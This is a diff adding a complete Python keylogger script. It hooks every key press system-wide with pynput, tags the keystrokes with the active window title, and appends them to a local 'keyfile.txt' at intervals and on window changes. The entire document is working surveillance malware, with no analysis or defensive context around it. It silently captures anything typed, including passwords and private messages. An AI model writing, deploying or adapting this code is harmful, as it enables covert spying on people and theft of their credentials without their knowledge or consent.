@@ -1,0 +1,67 @@
+import time
+from pynput import keyboard
+from pygetwindow import getActiveWindow
+
+current_window_title = None
+typed_text = []
+last_update_time = time.time()
+LOG_INTERVAL = 5  # Interval to log typed text when there's no window change
+
+def log_current_text():
+    #Helper function to log the current typed text
+    global current_window_title, typed_text
+    if current_window_title is not None:
+        with open("keyfile.txt", "a+") as logKey:
+            logKey.write(f"[{current_window_title}] {''.join(typed_text)}\n")
+
+def keyPressed(key):
+    global current_window_title, typed_text, last_update_time
+
+    # Get the currently active window
+    window = getActiveWindow()
+    if window:
+        window_title = window.title
+    else:
+        window_title = "Unknown"
+
+    # Detect internal changes within the same window
+    if window_title != current_window_title:
+        if current_window_title is not None:
+            log_current_text()
+        current_window_title = window_title
+        typed_text = []
+
+    # Handle keystrokes
+    key_str = str(key)
+    if key_str.startswith('Key'):
+        if key == keyboard.Key.space:
+            key_str = ' '
+        elif key == keyboard.Key.enter:
+            key_str = '\n'
+        elif key == keyboard.Key.backspace:
+            if typed_text:
+                typed_text.pop()  # Remove last character
+            return  # Don't log backspace as a character
+        else:
+            key_str = f'[{key_str}]'
+    else:
+        key_str = key_str
+
+    typed_text.append(key_str)
+    
+    # Update log file periodically
+    current_time = time.time()
+    if current_time - last_update_time > LOG_INTERVAL:
+        log_current_text()
+        last_update_time = current_time
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        # On interruption, make sure to log any remaining text
+        log_current_text()
